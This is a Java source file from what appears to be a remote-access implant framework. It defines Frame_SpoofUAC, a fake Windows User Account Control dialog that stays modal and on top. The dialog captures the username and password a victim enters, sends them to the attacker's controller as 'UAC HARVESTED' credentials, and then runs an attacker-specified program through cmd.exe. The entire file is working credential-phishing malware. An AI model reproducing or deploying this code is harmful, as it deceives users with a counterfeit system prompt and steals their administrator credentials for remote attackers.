/**
 * @author Solomon Sonya
 * 
 */

package Implant.Payloads;


import Controller.*;

import java.awt.Frame;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;

import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import javax.swing.Timer;
import javax.swing.UIManager;

import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Color;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;
import javax.swing.WindowConstants;
import javax.swing.table.*;
import java.awt.event.*;
import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_MainControllerWindow;
import Controller.GUI.JTable_Solomon;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import Implant.Splinter_IMPLANT;

import java.io.*;
import java.awt.GridBagLayout;

public class Frame_SpoofUAC extends JDialog implements ActionListener, MouseListener
{
	private static final String strMyClassName = "Frame_SpoofUAC";
	JButton jbtnYes = null;
	
	
	JPanel jpnlMain = new JPanel();
	public  JTextField jtfUserName;
	public  final JTextField jtfPassword = new JTextField();
	public  JPasswordField jpw = new JPasswordField();
	public  JButton jbtnNo = null;
	private final JLabel jlblProgramName = new JLabel("Default Program");
	private final JLabel jlblUAC_Image = new JLabel("");
	
	boolean resetUserName = true;
	boolean resetPassword = true;
	
	String strProgTitle = "Window Update";
	String strExecutablePath = null;
	Splinter_IMPLANT parent = null;
	
	public static final String jpwText = " Password";
	
	public Frame_SpoofUAC(String programTitle, String executablePath, Splinter_IMPLANT par)
	{
		try
		{
			this.setTitle("User Accounts Control");
			parent = par;
			this.setModaling();
			
			try 
			{	
			    UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			} 
			catch (Exception e) 
			{
			   // handle exception
			}
			
			jbtnYes = new JButton("Yes");
			jbtnNo = new JButton("No");
			
			//getContentPane().setLayout(null);
			//jbtnYes = new JButton("Yes");
			this.setContentPane(jpnlMain);
			jpnlMain.setLayout(null);
			
			if(programTitle != null && !programTitle.trim().equals("") && !programTitle.trim().toLowerCase().equals("null"))
			{
				strProgTitle = programTitle;
			}
			
			this.jlblProgramName.setText(strProgTitle.trim());
			
			if(executablePath == null || executablePath.trim().equalsIgnoreCase("null") || executablePath.trim().equals(""))
			{
				strExecutablePath = null;
			}
			else
			{
				strExecutablePath = executablePath;
			}
			
			try	
			{									
				//UAC ICON
				this.setIconImage(new ImageIcon(Frame_SpoofUAC.class.getResource("/Implant/Payloads/UAC.gif")).getImage());
				
			}	catch(Exception e){}
			
			setBounds(500, 200, 446, 340);
			this.setResizable(false);
			
			
			
			
			//jbtnYes = new JButton("New button");
			jpnlMain.add(jbtnYes);
			
			jbtnYes.setBounds(283, 281, 73, 25);
			
			jtfUserName = new JTextField();
			jtfUserName.setText(" User Name");
			jtfUserName.setBounds(100, 184, 197, 23);
			jpnlMain.add(jtfUserName);
			jtfUserName.setColumns(10);
			jtfPassword.setText(jpwText);
			jtfPassword.setColumns(10);
			jpw.setColumns(10);
			jpw.setBounds(100, 213, 197, 23);
			this.jpw.setOpaque(true);
			this.jpw.setBackground(Color.white);
			jtfPassword.setBounds(100, 213, 197, 23);
			
			jpnlMain.add(jtfPassword);
			jpnlMain.add(jpw);
			this.jpw.setVisible(false);
			jbtnNo.setBounds(364, 281, 73, 25);
			
			jpnlMain.add(jbtnNo);
			jlblProgramName.setFont(new Font("Arial", Font.PLAIN, 12));
			jlblProgramName.setBounds(199, 72, 226, 14);
			
			jpnlMain.add(jlblProgramName);
			jlblUAC_Image.setIcon(new ImageIcon(Frame_SpoofUAC.class.getResource("/Implant/Payloads/Windows_UAC.gif")));
			jlblUAC_Image.setBounds(0, 0, 441, 311);
			
			jpnlMain.add(jlblUAC_Image);
			jbtnYes.addActionListener(this);
			//jlblImage.setIcon(new ImageIcon(Frame_SpoofUAC.class.getResource("/Implant/Payloads/WindowsUAC.gif")));
			//getContentPane().add(BorderLayout.CENTER, this.jlblImage);
			
			//this.jlblImage.setIcon(new ImageIcon(Frame_SpoofUAC.class.getResource("/Implant/Payloads/WindowsUAC.gif")));
			
			jtfUserName.addMouseListener(this);
			this.jtfPassword.addMouseListener(this);
			
			
			jtfUserName.addActionListener(this);
			this.jtfPassword.addActionListener(this);
			this.jpw.addActionListener(this);
			this.jbtnNo.addActionListener(this);
			this.jbtnYes.addActionListener(this);
			
			try
			{
				this.jtfPassword.getDocument().addDocumentListener( new DocumentListener()
				{
					public void changedUpdate(DocumentEvent e)
					{
						//Driver.sop("Found 1");
					}
	
					public void insertUpdate(DocumentEvent e)
					{
						try
						{
							String typed = jtfPassword.getText().trim().substring(0, jtfPassword.getText().trim().toUpperCase().indexOf(jpwText.trim().toUpperCase()));
							jpw.setText(typed.trim());
						}
						catch(Exception ee){}
						
						
						showJPW();
						
					}
	
					public void removeUpdate(DocumentEvent e)
					{
						showJPW();
					}
				}
				);
			}catch(Exception e){Driver.sop("Unable to appropriate UAC");}
			
			//this.validate();
			jbtnYes.revalidate();
			
			this.addWindowListener(new java.awt.event.WindowAdapter() 
			{
				public void windowClosing(java.awt.event.WindowEvent e) 
				{
					parent.sendToController("User closed Spoofed UAC frame via the [X] close button. No credentials harvested.", false, true);
					closeFrame(); 			
				}
			});
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", strMyClassName, e, e.getLocalizedMessage(), false);
			
			this.dispose();//don't show the frame!
		}
	}
	
	
	
	public boolean setModaling()
	{
		try
		{
			
			this.setModal(true);
			this.setAlwaysOnTop(true);
			this.setModalityType (ModalityType.APPLICATION_MODAL);
			
			return true;
		}
		catch(Exception ee){Drivers.sop("in " + this.strMyClassName + " could not set modaling");}
		
		return false;
	}
	
	
	public void closeFrame()
	{
		try
		{
												
			this.setVisible(false);
			this.dispose();
			
		}
		catch(Exception e)
		{
			Drivers.eop("closeFrame", strMyClassName, e, e.getLocalizedMessage(), false);
			this.dispose();
		}
	}
	
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.jbtnNo)
			{
				parent.sendToController("User closed Spoofed UAC frame via the No button. No credentials harvested.", false, true);
				this.closeFrame();
			}
			
			else if(ae.getSource() == this.jbtnYes)
			{
				harvestUAC_Creds();
			}
			
			else if(ae.getSource() == this.jtfPassword)
			{
				harvestUAC_Creds();
			}
			
			else if(ae.getSource() == jpw)
			{
				this.harvestUAC_Creds();
			}
			
			else if(ae.getSource() == this.jtfUserName)
			{
				harvestUAC_Creds();
			}
			
			
		}
		
		catch(Exception e)
		{
			Driver.eop("ae", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	public boolean harvestUAC_Creds()
	{
		try
		{
			//ensure at least a user admin name is entered
			if(this.jtfUserName.getText() == null || this.jtfUserName.getText().trim().equals("") || this.jtfUserName.getText().trim().equals("User Name"))
			{
				//user entered nothing, redo!
				return false;
			}
			else
			{
				//harvest what the user entered
				String name = this.jtfUserName.getText().trim();
				String password = this.jtfPassword.getText();
				
				password = new String(jpw.getPassword());
				
				//send creds over to controller!
				parent.sendToController("UAC HARVESTED USERNAME:" + name + " PW:" + password, false, false);
				
				//now attempt to start the program specified by the spoof
				if(this.strExecutablePath != null && !this.strExecutablePath.trim().equals(""))
				{
					Process process = Runtime.getRuntime().exec("cmd.exe /C " + strExecutablePath.trim(), null, new File("."));
				}
				
				//otherwise, don't execute anything else, and close!!!
				
				//close the frame now!
				this.closeFrame();
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("harvestUAC_Creds", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean showJPW()
	{
		try
		{
			jtfPassword.setVisible(false);		
			jpw.setVisible(true);
			//jpnlMain.add(this.jpw);
			
			try	{	this.jpw.setFocusable(true);	this.jpw.requestFocus();}catch(Exception e){}	
			
			this.jpnlMain.validate();
			this.jpnlMain.repaint();
			this.validate();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("showJPW", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public void mouseClicked(MouseEvent me)
	{
		
	}


	@Override
	public void mouseEntered(MouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}


	@Override
	public void mouseExited(MouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}


	@Override
	public void mousePressed(MouseEvent me) 
	{
		try
		{
			if(me.getSource() == this.jtfPassword && this.resetPassword)
			{
				this.resetPassword = false;//only clear the tf once!!!
				this.jtfPassword.setText("");
				
				showJPW();
			}
			
			else if(me.getSource() == this.jtfUserName && this.resetUserName)
			{
				this.resetUserName = false;//only clear the tf once!!!
				this.jtfUserName.setText("");
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("Mouse Event", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}


	@Override
	public void mouseReleased(MouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}
}
